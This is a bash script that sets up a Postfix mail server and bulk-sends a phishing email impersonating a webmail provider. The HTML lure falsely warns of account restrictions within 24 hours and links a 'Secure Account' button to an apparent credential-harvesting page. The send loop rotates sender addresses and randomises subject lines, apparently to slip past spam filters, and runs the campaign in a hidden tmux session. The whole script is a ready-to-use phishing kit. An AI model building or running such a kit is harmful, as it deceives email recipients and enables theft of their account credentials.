#!/bin/bash

# Ensure the script is run with root privileges
if [ "$EUID" -ne 0 ]; then
  echo "Please run this script as root or with sudo privileges."
  exit 1
fi

# === Predefined values for automated setup ===
myhostname="mail.admailsend.com"
sender_email="supportzed@admailsend.com"
sender_name="EMAIL UPDATE"
email_subject="WEBMAIL SECURE MESSAGE"
email_list="list.txt"  # Ensure this file exists or provide full path

# === Install required packages ===
echo "Updating package list and installing Postfix and tmux..."
apt-get update -y
apt-get install -y postfix tmux mailutils

# === Backup and create new Postfix configuration ===
echo "Backing up and replacing Postfix main.cf..."
cp /etc/postfix/main.cf /etc/postfix/main.cf.backup
rm /etc/postfix/main.cf

tee /etc/postfix/main.cf > /dev/null <<EOL
myhostname = $myhostname
inet_interfaces = loopback-only
relayhost = 
mydestination = localhost
smtp_sasl_auth_enable = no
smtpd_sasl_auth_enable = no
smtp_sasl_security_options = noanonymous
smtp_tls_security_level = none
queue_directory = /var/spool/postfix
command_directory = /usr/sbin
daemon_directory = /usr/lib/postfix/sbin
mailbox_size_limit = 0
recipient_delimiter = +
EOL

echo "Restarting Postfix..."
service postfix restart

# === Create HTML email content ===
echo "Creating email.html..."
cat > email.html <<EOL
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Action Required: Update Your Account</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f2f4f8;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 600px;
      margin: 40px auto;
      background-color: #ffffff;
      border-radius: 10px;
      padding: 30px 40px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
    }
    .header {
      text-align: center;
      margin-bottom: 25px;
    }
    .header img {
      max-width: 180px;
      margin-bottom: 10px;
    }
    .title {
      font-size: 22px;
      font-weight: 600;
      color: #0077cc;
    }
    .content {
      font-size: 16px;
      color: #444;
      line-height: 1.7;
    }
    .content p {
      margin: 16px 0;
    }
    .button-container {
      text-align: center;
      margin-top: 30px;
    }
    .cta-button {
      background-color: #0077cc;
      color: #ffffff;
      padding: 14px 28px;
      border-radius: 6px;
      text-decoration: none;
      font-size: 16px;
      font-weight: 600;
      transition: background-color 0.3s ease;
    }
    .cta-button:hover {
      background-color: #005fa3;
    }
    .footer {
      margin-top: 40px;
      font-size: 12px;
      color: #888;
      text-align: center;
      line-height: 1.5;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <img src="https://ik.imagekit.io/yleultaj4/webmail.jpg?updatedAt=1747527364367" alt="Webmail Logo" />
      <div class="title">Action Required: Update Your Account</div>
    </div>
    <div class="content">
      <p>Dear {{EMAIL}},</p>
      <p>We have recently updated our <strong>Webmail Terms of Service</strong> to better serve you and enhance the security of your account.</p>
      <p>To ensure uninterrupted access, we kindly request you to verify and update your account details.</p>
      <p><strong>What you need to do:</strong><br>
      Click the button below to review and confirm your account information.</p>
      <p><strong>Please Note:</strong><br>
      Failure to complete this process within the next 24 hours may result in temporary access restrictions or potential data loss.</p>
    </div>
    <div class="button-container">
      <a href="https://quiet-star-25e9.stacyjenn973.workers.dev/" class="cta-button">Secure Account</a>
    </div>
    <div class="footer">
      &copy; 2025 Webmail Services. All rights reserved.<br />
      This is an automated message—please do not reply.
    </div>
  </div>
</body>
</html>
EOL

# Make email.html writable (rw-rw-r--)
chmod 664 email.html
# Optional: Change ownership to a non-root user
# chown yourusername:yourusername email.html

# === Create the send script ===
echo "Creating send.sh..."
cat > send.sh <<'EOL'
#!/bin/bash

# Counter for generating unique usernames
counter=1

# Loop through each email in the list
while IFS= read -r email; do
  echo "Sending email to: $email"

  # Generate unique From email
  from_username="supportzed$counter"
  from_domain="admailsend.com"
  from_email="$from_username@$from_domain"
  from_name="EMAIL UPDATE"
  from_header="$from_name <$from_email>"

  # Generate random 3-digit number (e.g., 123)
  random_number=$(shuf -i 100-999 -n 1)

  # Construct the subject with random number
  subject="SECURE MESSAGE - [Your email is outdated] ! ($random_number)"

  # Generate random 3-letter subdomain
  subdomain=$(tr -dc 'a-z' </dev/urandom | head -c3)

  # Read HTML content and replace placeholders
  html_content=$(sed "s/{{EMAIL}}/$email/g; s/{{SUBDOMAIN}}/$subdomain/g" email.html)

  # Send the email
  cat <<EOF | /usr/sbin/sendmail -t
To: $email
From: $from_header
Subject: $subject
MIME-Version: 1.0
Content-Type: text/html

$html_content
EOF

  # Increment counter for next unique From email
  ((counter++))

done < list.txt
EOL

# Make send.sh executable and writable (rwxrwxr-x)
chmod +x send.sh
# Optional: Change ownership

# === Run the send.sh script in a tmux session ===
echo "Starting tmux session for bulk email sending..."
tmux new-session -d -s mail_session "./send.sh"

echo "Creating list.txt..."
cat > list.txt <<EOL
EOL
echo "✅ Setup complete. Emails are being sent in a tmux session."
echo "To reattach: tmux attach -t mail_session"
sudo chown -R $USER:$USER ~/REVOPAIN
